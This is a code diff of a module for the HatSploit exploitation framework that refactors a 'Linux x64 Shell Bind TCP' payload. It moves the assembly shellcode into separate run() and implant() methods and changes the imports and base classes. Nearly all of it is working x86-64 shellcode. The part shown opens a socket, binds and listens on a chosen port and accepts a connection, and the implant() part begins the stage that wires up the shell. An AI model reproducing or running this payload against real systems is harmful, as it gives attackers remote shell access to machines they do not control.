@@ -3,16 +3,17 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
+
 from pex.assembler import Assembler
 from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler, Socket):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Linux x64 Shell Bind TCP",
             'Payload': "linux/x64/shell_bind_tcp",
             'Authors': [
@@ -23,44 +24,13 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Platform': "linux",
             'Rank': "high",
             'Type': "bind_tcp",
-        }
+        })
 
-    def run(self):
-        bport = self.pack_port(self.handler['BPORT'])
-
+    def implant(self):
         return self.assemble(
             self.details['Architecture'],
-            f"""
+            """
             start:
-                push 0x29
-                pop rax
-                cdq
-                push 0x2
-                pop rdi
-                push 0x1
-                pop rsi
-                syscall
-
-                xchg rdi, rax
-                push rdx
-                mov dword ptr [rsp], 0x{bport.hex()}0002
-                mov rsi, rsp
-                push 0x10
-                pop rdx
-                push 0x31
-                pop rax
-                syscall
-
-                push 0x32
-                pop rax
-                syscall
-
-                xor rsi, rsi
-                push 0x2b
-                pop rax
-                syscall
-
-                xchg rdi, rax
                 push 0x3
                 pop rsi
 
@@ -83,3 +53,42 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 syscall
             """
         )
+
+    def run(self):
+        port = self.pack_port(self.rport.value)
+
+        return self.assemble(
+            self.details['Architecture'],
+            f"""
+            start:
+                push 0x29
+                pop rax
+                cdq
+                push 0x2
+                pop rdi
+                push 0x1
+                pop rsi
+                syscall
+
+                xchg rdi, rax
+                push rdx
+                mov dword ptr [rsp], 0x{port.hex()}0002
+                mov rsi, rsp
+                push 0x10
+                pop rdx
+                push 0x31
+                pop rax
+                syscall
+
+                push 0x32
+                pop rax
+                syscall
+
+                xor rsi, rsi
+                push 0x2b
+                pop rax
+                syscall
+
+                xchg rdi, rax
+            """
+        ) + self.implant()
